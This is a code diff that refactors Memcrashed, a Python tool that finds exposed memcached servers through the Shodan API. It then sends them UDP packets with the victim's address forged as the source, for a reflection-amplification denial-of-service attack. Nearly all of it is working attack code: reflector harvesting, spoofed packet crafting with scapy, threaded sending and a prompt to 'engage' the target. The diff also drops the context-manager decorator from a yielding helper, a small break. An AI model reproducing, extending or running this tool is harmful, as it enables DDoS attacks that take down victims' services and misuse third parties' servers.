@@ -9,21 +9,23 @@ import logging
 from pathlib import Path
 from scapy.all import *
 from contextlib import contextmanager, redirect_stdout
-import datetime
 from random import randint, uniform, choice
-from threading import Thread
 from concurrent.futures import ThreadPoolExecutor
 
+# Configure logging
 logging.basicConfig(level=logging.INFO, format='[%(levelname)s] %(message)s')
 
-starttime = time.time()
+# Global constants
+RATE_LIMIT_DELAY = 2  # Delay for rate-limiting API requests
+MAX_WORKERS = 50  # Maximum number of threads for sending packets
 
-@contextmanager
+# Context manager to suppress stdout
 def suppress_stdout():
     with open(os.devnull, "w") as devnull:
         with redirect_stdout(devnull):
             yield
 
+# Validate if a string is a valid IP address
 def is_valid_ip(ip):
     try:
         ipaddress.ip_address(ip)
@@ -31,9 +33,11 @@ def is_valid_ip(ip):
     except ValueError:
         return False
 
+# Generate a random spoofed IP address
 def random_ip():
     return f"{randint(1, 255)}.{randint(1, 255)}.{randint(1, 255)}.{randint(1, 255)}"
 
+# Generate a random payload for the attack
 def generate_payload():
     commands = [
         "\x00\x00\x00\x00\x00\x01\x00\x00stats\r\n",
@@ -42,34 +46,24 @@ def generate_payload():
     ]
     return choice(commands)
 
-class Color:
-    HEADER = '\033[0m'
+# Initialize Shodan API
+def initialize_api():
+    global SHODAN_API_KEY, api
+    while True:
+        try:
+            api = shodan.Shodan(SHODAN_API_KEY)
+            api.info()  # Test API key validity
+            print('[~] API Key verified successfully.')
+            break
+        except shodan.APIError as e:
+            print(f'[✘] API Key Error: {e}')
+            SHODAN_API_KEY = input('[*] Please enter a valid Shodan.io API Key: ').strip()
+            with open('api.txt', 'w') as file:
+                file.write(SHODAN_API_KEY)
+                print('[~] File written: ./api.txt')
 
+# Load Shodan API key
 keys = Path("./api.txt")
-logo = Color.HEADER + '''
-
-   ███╗   ███╗███████╗███╗   ███╗ ██████╗██████╗  █████╗ ███████╗██╗  ██╗███████╗██████╗ 
-   ████╗ ████║██╔════╝████╗ ████║██╔════╝██╔══██╗██╔══██╗██╔════╝██║  ██║██╔════╝██╔══██╗
-   ██╔████╔██║█████╗  ██╔████╔██║██║     ██████╔╝███████║███████╗███████║█████╗  ██║  ██║
-   ██║╚██╔╝██║██╔══╝  ██║╚██╔╝██║██║     ██╔══██╗██╔══██║╚════██║██╔══██║██╔══╝  ██║  ██║
-   ██║ ╚═╝ ██║███████╗██║ ╚═╝ ██║╚██████╗██║  ██║██║  ██║███████║██║  ██║███████╗██████╔╝
-   ╚═╝     ╚═╝╚══════╝╚═╝     ╚═╝ ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚══════╝╚═════╝ 
-
-                                        Author: @037
-                                        Version: 4.0
-
-####################################### DISCLAIMER ########################################
-| Memcrashed is a tool that allows you to use Shodan.io to obtain hundreds of vulnerable  |
-| memcached servers. It then allows you to use the same servers to launch widespread      |
-| distributed denial of service attacks by forging UDP packets sourced to your victim.    |
-| Default payload includes the memcached "stats" command, 10 bytes to send, but the reply |
-| is between 1,500 bytes up to hundreds of kilobytes. Please use this tool responsibly.   |
-| I am NOT responsible for any damages caused or any crimes committed by using this tool. |
-###########################################################################################
-                                                                                      
-'''
-print(logo)
-
 if keys.is_file():
     with open('api.txt', 'r') as file:
         SHODAN_API_KEY = file.readline().strip()
@@ -79,14 +73,16 @@ else:
         file.write(SHODAN_API_KEY)
         print('[~] File written: ./api.txt')
 
-# To store debugging information
-debug_logs = []
+# Initialize Shodan API
+initialize_api()
+
+debug_logs = []  # Debug log storage
 
 while True:
-    api = shodan.Shodan(SHODAN_API_KEY)
     try:
-        myresults = Path("./bots.txt")
         query = input("[*] Use Shodan API to search for affected Memcached servers? <Y/n>: ").lower()
+        ip_array = []
+
         if query.startswith('y'):
             print('[~] Checking Shodan.io API Key...')
             try:
@@ -95,37 +91,29 @@ while True:
                 for page in range(1, (total_results // 100) + 2):
                     results = api.search('product:"Memcached" port:11211', page=page)
                     all_matches.extend(results['matches'])
-                    time.sleep(2)  # Avoid rate-limiting
+                    time.sleep(RATE_LIMIT_DELAY)  # Avoid rate-limiting
                 print(f'[~] Total bots retrieved: {len(all_matches)}')
 
-                saveresult = input("[*] Save results for later usage? <Y/n>: ").lower()
-                if saveresult.startswith('y'):
-                    with open('bots.txt', 'w') as file2:
+                if input("[*] Save results for later usage? <Y/n>: ").lower().startswith('y'):
+                    with open('bots.txt', 'w') as file:
                         for result in all_matches:
-                            file2.write(result['ip_str'] + "\n")
+                            file.write(result['ip_str'] + "\n")
                     print('[~] File written: ./bots.txt')
+
+                ip_array = [result['ip_str'] for result in all_matches if is_valid_ip(result['ip_str'])]
             except shodan.APIError as e:
                 print(f'[✘] Error: {e}')
-                option = input('[*] Would you like to change the API Key? <Y/n>: ').lower()
-                if option.startswith('y'):
-                    SHODAN_API_KEY = input('[*] Please enter a valid Shodan.io API Key: ').strip()
-                    with open('api.txt', 'w') as file:
-                        file.write(SHODAN_API_KEY)
-                        print('[~] File written: ./api.txt')
-                    # Reinitialize the Shodan API client with the new key
-                    api = shodan.Shodan(SHODAN_API_KEY)
+                if input('[*] Would you like to change the API Key? <Y/n>: ').lower().startswith('y'):
+                    initialize_api()
                     continue
                 else:
                     print('[✘] Exiting...')
                     break
 
-        if myresults.is_file() and input('[*] Use locally stored Shodan data? <Y/n>: ').lower().startswith('y'):
-            with open('bots.txt') as my_file:
-                ip_array = [line.strip() for line in my_file if is_valid_ip(line.strip())]
+        elif Path("./bots.txt").is_file() and input('[*] Use locally stored Shodan data? <Y/n>: ').lower().startswith('y'):
+            with open('bots.txt') as file:
+                ip_array = [line.strip() for line in file if is_valid_ip(line.strip())]
                 print(f'[~] Total valid bots after filtering: {len(ip_array)}')
-        else:
-            ip_array = []
-            print('[✘] Error: No valid bots found in bots.txt')
 
         if not ip_array:
             print('[✘] No valid bots available. Exiting...')
@@ -148,8 +136,7 @@ while True:
             print('[✘] Invalid power value. Exiting...')
             break
 
-        engage = input(f'[*] Ready to engage target {target}? <Y/n>: ').lower()
-        if not engage.startswith('y'):
+        if not input(f'[*] Ready to engage target {target}? <Y/n>: ').lower().startswith('y'):
             print('[✘] Engagement canceled. Exiting...')
             break
 
@@ -161,36 +148,20 @@ while True:
             try:
                 response = sr1(IP(src=src_ip, dst=ip) / UDP(sport=targetport, dport=11211) / Raw(load=payload), timeout=2, verbose=0)
                 if response:
-                    debug_logs.append(f"[✓] Response received from {ip}")
+                    print(f"[✓] Response received from {ip}")
                 else:
-                    debug_logs.append(f"[!] No response from {ip}")
+                    print(f"[!] No response from {ip}")
             except Exception as e:
-                debug_logs.append(f"[✘] Error while sending to {ip}: {e}")
-            time.sleep(uniform(0.5, 2))  # Introduce random delays
+                print(f"[✘] Error while sending to {ip}: {e}")
+            time.sleep(uniform(0.5, 2))
 
-        with ThreadPoolExecutor(max_workers=50) as executor:
+        max_threads = min(MAX_WORKERS, len(ip_array) or 1)
+        with ThreadPoolExecutor(max_workers=max_threads) as executor:
             executor.map(send_payload, ip_array)
 
         print('[✓] Task complete! Exiting platform.')
-        print('\nDebug Log:')
-        for log in debug_logs:
-            print(log)
         break
 
-    except shodan.APIError as e:
-        print(f'[✘] Shodan API Error: {e}')
-        option = input('[*] Would you like to change the API Key? <Y/n>: ').lower()
-        if option.startswith('y'):
-            SHODAN_API_KEY = input('[*] Please enter a valid Shodan.io API Key: ').strip()
-            with open('api.txt', 'w') as file:
-                file.write(SHODAN_API_KEY)
-                print('[~] File written: ./api.txt')
-            # Reinitialize the Shodan API client
-            api = shodan.Shodan(SHODAN_API_KEY)
-        else:
-            print('[✘] Exiting program.')
-            break
     except Exception as e:
         logging.error(f'Unexpected error: {e}')
         break
-
